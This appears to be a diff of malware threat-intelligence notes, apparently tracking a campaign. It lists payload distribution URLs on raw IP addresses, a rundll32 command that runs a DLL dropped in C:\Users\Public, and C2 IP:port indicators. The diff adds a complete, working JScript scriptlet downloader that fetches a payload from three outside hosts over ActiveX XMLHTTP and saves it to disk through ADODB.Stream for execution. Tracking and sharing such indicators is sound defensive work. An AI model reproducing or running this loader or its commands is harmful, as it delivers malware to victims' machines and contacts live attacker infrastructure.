@@ -22,15 +22,57 @@ rundll32.exe C:\Users\Public\ac25J7XvEMogGD.dat,#46
 
 .dll distro
 
-http://192.121.23.61/9a67pes/aojfLvzBDEGdcq0
-http://192.121.23.104/TLGhNd/aojfLvzBDEGdcq0
-http://149.154.159.98/PpUYX/aojfLvzBDEGdcq0
+http://192.121.23.104/TLGhNd/aNf2FLKucR
+http://149.154.159.98/PpUYX/aNf2FLKucR
+http://192.121.23.61/9a67pes/aNf2FLKucR
 
 conhost.exe rundll32.exe C:\Users\Public\ac25J7XvEMogGD.dat,bind
 
 >> real export
 
 conhost.exe rundll32.exe C:\Users\Public\ac25J7XvEMogGD.dat,#46
+
+*************************************************
+
+<?xml version="1.0"?>
+<package>
+<component id="s1">
+<script language="JScript">
+<![CDATA[
+	var http = new ActiveXObject("microsoft.xmlhttp");
+	var adodb = new ActiveXObject("adodb.stream");
+]]>
+</script>
+<script language="JScript">
+<![CDATA[
+
+	var u = "http://192.121.23.104/TLGhNd/aNf2FLKucR,http://149.154.159.98/PpUYX/aNf2FLKucR,http://192.121.23.61/9a67pes/aNf2FLKucR".split(",");
+
+	for(i = 0; i < u.length; i++)
+	{
+		try
+		{
+			http.open("GET", u[i], false);
+			http.send();
+
+			if(http.readyState == 4 && http.status == 200)
+			{
+				adodb.type = 1;
+				adodb.open();
+				content = http.ResponseBody;
+				adodb.write(content);
+				adodb.savetofile("C:\\Users\\Public\\ac25J7XvEMogGD.dat", 2);
+				break;
+			}
+		}
+
+		catch(e){}
+	}
+
+]]>
+</script>
+</component>
+</package>
 
 *************************************************
 
@@ -156,4 +198,3 @@ c2's
 103.144.201.56:2078
 86.195.14.72:2222
 41.186.88.38:443
-
